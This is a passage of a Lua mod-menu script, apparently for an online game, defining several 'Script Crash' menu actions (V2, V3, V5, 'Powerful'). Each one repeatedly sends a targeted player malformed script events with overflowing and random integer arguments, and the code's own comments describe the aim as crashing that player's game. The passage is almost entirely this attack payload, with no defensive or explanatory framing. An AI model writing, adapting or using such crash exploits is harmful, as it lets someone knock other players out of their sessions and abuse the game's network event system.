            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1733737974, player_id, 789522, 59486,48512151,-9545440,5845131,848153,math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-1529596656, player_id, 795221, 59486,48512151,-9545440 , math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    
    end)

    menu.action(scrcrash, "Script Crash V2", {"crashv7"}, "", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {2765370640, player_id, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.yield()
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {1348481963, player_id, math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        end
        util.yield(100)
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {-555356783, 18, -72614, 63007, 59027, -12012, -26996, 33398, 18, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << player_id, {962740265, 2000000, 2000000, 2000000, 2000000})
        util.trigger_script_event(1 << player_id, {1228916411, 1, 1245317585})
        util.trigger_script_event(1 << player_id, {962740265, 1, 0, 144997919, -1907798317, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-1386010354, 1, 0, 92623021, -1907798317, 0, 0, 0, 0, 1})
        util.trigger_script_event(1 << player_id, {-555356783, player_id, 85952,99999,52682274855,526822745})
        util.trigger_script_event(1 << player_id, {526822748, player_id, 78552,99999 ,7949161,789454312})
        util.trigger_script_event(1 << player_id, {-8965204809, player_id, 795221,59486,48512151,-9545440})
        util.trigger_script_event(1 << player_id, {495813132, player_id, 0, 0, -12988, -99097, 0})
        util.trigger_script_event(1 << player_id, {495813132, player_id, -4640169, 0, 0, 0, -36565476, -53105203})
        util.trigger_script_event(1 << player_id, {495813132, player_id,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

	
	menu.action(scrcrash, "Script Crash V3", {"crashv8"}, "It doesn't work very well", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
                util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            end
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
            util.trigger_script_event(1 << player_id, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
	
    -- This is a Prisuhm crash fixed by me <3
	
	    menu.action(scrcrash, "Script Crash V5", {"crashv11"}, "No funciona muy bien", function()
        local int_min = -2147483647
        local int_max = 2147483647
        for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.yield()
            for i = 1, 15 do
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
    end)
	
    menu.action(scrcrash, "Script Crash Powerful", {"crashv9"}, "Funciona, pero... esta muy potente .w. (Posible overload)", function()
        local int_min = -2147483647
        local int_max = 2147483647
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
            util.trigger_script_event(1 << player_id, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
            util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
            util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
            util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
            util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
            util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.yield(200)
            for i = 1, 15 do
                util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
                util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
                util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
                util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
                util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
                util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
                util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
                util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
                util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
                util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
                util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
                util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
                util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
                util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
                util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
                util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
                util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
                util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
                util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
                util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
                util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
                util.trigger_script_event(1 << player_id, {526822748, 11, -816412562, 287645562, 837529308, 323470085, -1998237593, -1690600187, 84254827, -1951955923, -2095831385})
                util.trigger_script_event(1 << player_id, {526822748, 11, 1128498063, 1360868511, -865347196, -557706333, -1887266413, 1345475135, 1989018772, 717380969, -415150685})
                util.trigger_script_event(1 << player_id, {526822748, 11, -705491730, 823549000, -1822768487, -1739790965, 165753982, 2122960063, -667384122, 1425474709, -457783980})
                util.trigger_script_event(1 << player_id, {526822748, 11, -242557764, 2108273744, 1203705000, -260662079, -291417627, -1745428280, -157101732, 1922517576, 1561745874})
                util.trigger_script_event(1 << player_id, {-555356783, 11, -1582452076, 17003, 26835, 1569810490549068877, 6758469007872221240, 43283})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, -2021950857, 545602720, -453294100, 2036940046, -1361051504, 1359316386, -1373299891, 1, 1863903745, -1185286333, -1523746809})
                util.trigger_script_event(1 << player_id, {-1529596656, 1, -547323955, 1909743175, 941525603, -681672167, -37846071, 885891458, -976189034, 1276531471, 1, 2110941492, -833335907, 391956694})
            end
            util.trigger_script_event(1 << player_id, {526822748, 16, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647, 2147483647})
            util.trigger_script_event(1 << player_id, {1480548969, 28838, 32517, 8421, 9223372036854775807, 14145, 5991, 9223372036854775807, 1969, 21839, 9223372036854775807, 24308, 16565, 9223372036854775807, 23762, 19473, 9223372036854775807, 23681, 21970, 9223372036854775807, 23147, 27053, 9223372036854775807, 22708, 6508, 9223372036854775807, 16715, 4429, 9223372036854775807, 31066, 27689, 9223372036854775807, 14663, 11771, 9223372036854775807, 5541, 16259, 9223372036854775807, 18631, 23572, 9223372036854775807, 2514, 10966, 9223372036854775807, 25988, 18170, 9223372036854775807, 28168, 22199, 9223372036854775807, 655, 3850})
            util.trigger_script_event(1 << player_id, {1348481963, 22, -2147483647})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 0, -12988, -99097, 0})
            util.trigger_script_event(1 << player_id, {495813132, 22, -4640169, 0, 0, 0, -36565476, -53105203})
            util.trigger_script_event(1 << player_id, {495813132, 22, 0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
            util.trigger_script_event(1 << player_id, {526822748, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-555356783, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-637352381, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-51486976, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {-1386010354, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {526822748, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-555356783, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-637352381, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-51486976, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {-1386010354, 23135423, 3, 827870001, 2022580431, -918761645, 1754244778, 827870001, 1754244778, 23135423, 827870001, 23135423})
            util.trigger_script_event(1 << player_id, {526822748, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-637352381, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-51486976, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {-1386010354, 0, 0, 30583, 0, 0, 0, -328966, 1132039228, 0})
            util.trigger_script_event(1 << player_id, {1480548969, -1, 500000, 849451549, -1, -1})
            util.trigger_script_event(1 << player_id, {1368055548, 29, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {1670832796, 4, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
            util.trigger_script_event(1 << player_id, {-555356783, 18, 1181545014, 66847, 16512, -1728308262, 1797714157, 44364})
            util.trigger_script_event(1 << player_id, {526822748, 18, -252246819, -18727154, 729251007, 477211955, 1265445787, 252583446, -1455411232, 1692205759, -2135071973})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1262755360, 1372173016, -1675870560, -89948183, 1739305509, -1118757157, -963975099, -375746941, -861965357})
            util.trigger_script_event(1 << player_id, {526822748, 18, 2109306678, -238618626, 827622762, 527014411, 433490200, 634886015, 1167005379, 102577443, -1595019271})
            util.trigger_script_event(1 << player_id, {526822748, 18, -1432379159, -2105177550, 1136152658, -174340567, 1878363388, -1093998180, -1158744557, -1615814279, 1028425930})
            util.trigger_script_event(1 << player_id, {526822748, 18, 1908856972, 217055392, -682696668, -2041278640, 71112541, 445821521, 1779086315, -287169950, 897589825})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1484511631, -1599137234, 2055731395, -2079047237, 1510242096, 1565386877, -495391883, -1566944063, -675216641})
            util.trigger_script_event(1 << player_id, {526822748, 11, 868334758, 230158500, -1303408836, -1815364434, 477610132, 1002642801, 609316783, -569994045, 565250372})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 7176115211845551268, 61009, 39468, 92397956, 8397825222767844196, 75355})
            util.trigger_script_event(1 << player_id, {526822748, 11, -38079707, -1762764388, -1212511044, 1722735276, 747751030, 1627084405, -1669482519, 691802088, 1327636093})
            util.trigger_script_event(1 << player_id, {526822748, 11, -52418579, -1541673996, 1604315775, -1142145443, 1684449939, -1195278278, 883989587, 1173702083, -412631166})
            util.trigger_script_event(1 << player_id, {526822748, 11, 1076530873, 1288841582, 1558033636, -590295408, 293596065, 2146228985, 602822022, -929823553, 1568191644})
            util.trigger_script_event(1 << player_id, {526822748, 11, -669474940, -104022030, -1315797851, 1324134604, 1190372743, -366052066, -1881473352, -1823988801, -7868062})
            util.trigger_script_event(1 << player_id, {-555356783, 11, 1949682759, 97156, 39861, 4361321343446828617, 1487626644, 13166})
